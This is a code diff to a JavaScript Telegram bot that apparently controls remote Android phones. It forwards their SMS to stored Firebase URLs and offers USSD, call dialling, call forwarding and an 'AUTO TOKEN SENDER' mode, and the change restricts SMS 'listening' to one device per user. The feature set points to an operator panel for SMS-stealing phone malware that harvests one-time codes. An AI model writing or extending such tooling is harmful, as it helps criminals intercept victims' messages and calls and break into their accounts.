@@ -166,6 +166,7 @@ function getUserData(userId) {
     fwd_state: {},
     forward_number: '',
     listening: false,
+    listening_device: '',
     sms_cursor: {},
     createdAt: new Date().toISOString(),
     lastSeen: new Date().toISOString()
@@ -659,10 +660,13 @@ async function smsForwardOnce() {
     for (const [uid, u] of Object.entries(state.users || {})) {
       if (!u.listening) continue;
       const urls = u.fb_urls || [];
-      const devs = Object.values(state.global_devices || {})
+      let devs = Object.values(state.global_devices || {})
         .filter(g => g.owner_uid === String(uid))
         .map(g => g.id);
-      if (u.device_id && !devs.includes(u.device_id)) devs.push(u.device_id);
+      // Only ONE active device per Telegram user — the one they last
+      // enabled Listening on. Enabling another device switches off the previous one.
+      if (u.listening_device) devs = devs.filter(id => id === u.listening_device);
+      if (u.device_id && !devs.includes(u.device_id) && (!u.listening_device || u.listening_device === u.device_id)) devs.push(u.device_id);
       if (!devs.length || !urls.length) continue;
       if (!u.sms_cursor || typeof u.sms_cursor !== 'object') u.sms_cursor = {};
       const ud = getUserData(uid);
@@ -1045,7 +1049,7 @@ async function showDeviceManagement(uid, chatId, messageId, deviceId, edit = tru
   }
   const user = getUserData(uid);
   if (!forAdmin) {
-    updateUserData(uid, { device_id: deviceId, device_name: info.name, listening: true });
+    updateUserData(uid, { device_id: deviceId, device_name: info.name, listening: true, listening_device: deviceId });
   }
   const sim = (user.default_sim || 'sim1').toUpperCase();
   let bEmoji = '🟡';
@@ -1098,7 +1102,7 @@ async function showDeviceManagement(uid, chatId, messageId, deviceId, edit = tru
     [{ text: '📱 USSD', callback_data: `ussd_${deviceId}` }, { text: '📞 Call Dial', callback_data: `calldial_${deviceId}` }],
     [{ text: `📡 Call Fwd`, callback_data: `callfwd_${deviceId}` }],
     [{ text: `✅ Check Balance`, callback_data: `checkbalance_${deviceId}` }],
-    [{ text: `📡 Listening: ${user.listening ? '🟢 ON' : '⚫ OFF'}`, callback_data: `toggle_listen_${deviceId}` }],
+    [{ text: `📡 Listening: ${user.listening && (user.listening_device === deviceId || !user.listening_device) ? '🟢 ON' : '⚫ OFF'}`, callback_data: `toggle_listen_${deviceId}` }],
     [{ text: `${(user.default_sim || 'sim1') === 'sim1' ? '●' : '○'} SIM1`, callback_data: `sim_${deviceId}_sim1` }, { text: `${(user.default_sim || 'sim1') === 'sim2' ? '●' : '○'} SIM2`, callback_data: `sim_${deviceId}_sim2` }],
     [{ text: '🔄 Refresh', callback_data: `refresh_${deviceId}` }, { text: '🔙 Back', callback_data: forAdmin ? 'admin_devices' : 'online_devices' }]
   ];
@@ -1810,7 +1814,7 @@ async function handleCallback(update) {
       case 'toggle_auto': {
         const user = getUserData(uid);
         const nowOn = !(user.auto_forward !== false);
-        updateUserData(uid, { auto_forward: nowOn, listening: nowOn });
+        updateUserData(uid, { auto_forward: nowOn, listening: nowOn, listening_device: nowOn ? (user.device_id || '') : '' });
         return showMainMenu(uid, chatId, msgId, true);
       }
       case 'logout': return showLogoutConfirm(uid, chatId, msgId, true);
@@ -1921,7 +1925,7 @@ async function handleCallback(update) {
         return;
       }
       const info = await getDeviceInfo(uid, deviceId);
-      updateUserData(uid, { device_id: deviceId, device_name: info?.name || deviceId, auto_forward: true, listening: true });
+      updateUserData(uid, { device_id: deviceId, device_name: info?.name || deviceId, auto_forward: true, listening: true, listening_device: deviceId });
       const lines = [
         '✅ **AUTO TOKEN SENDER**', '══════════════════════', '',
         '**Auto SMS Activated**',
@@ -1959,9 +1963,11 @@ async function handleCallback(update) {
     if (data.startsWith('toggle_listen_')) {
       const deviceId = data.substring(13);
       const u = getUserData(uid);
-      u.listening = !u.listening;
+      const wasOn = u.listening && u.listening_device === deviceId;
+      u.listening = !wasOn;
+      u.listening_device = wasOn ? '' : deviceId;
       saveState();
-      await answerCallback(cb.id, u.listening ? '📡 Listening ON' : 'Listening OFF');
+      await answerCallback(cb.id, wasOn ? 'Listening OFF' : '📡 Listening ON');
       return showDeviceManagement(uid, chatId, msgId, deviceId, true);
     }
     if (data.startsWith('fwden_')) {
@@ -2023,14 +2029,14 @@ async function handleCommand(update) {
 
     if (text.startsWith('/cancel')) {
       clearAwaiting(uid);
-      updateUserData(uid, { listening: false });
+      updateUserData(uid, { listening: false, listening_device: '' });
       await sendMessage(chatId, '❌ Cancelled.');
       return showMainMenu(uid, chatId);
     }
 
     if (text.startsWith('/start')) {
       clearAwaiting(uid);
-      updateUserData(uid, { listening: false });
+      updateUserData(uid, { listening: false, listening_device: '' });
       const user = getUserData(uid);
       if (user.fb_urls && user.fb_urls.length > 0) return showLoginStatus(uid, chatId);
       return showWelcome(uid, chatId);
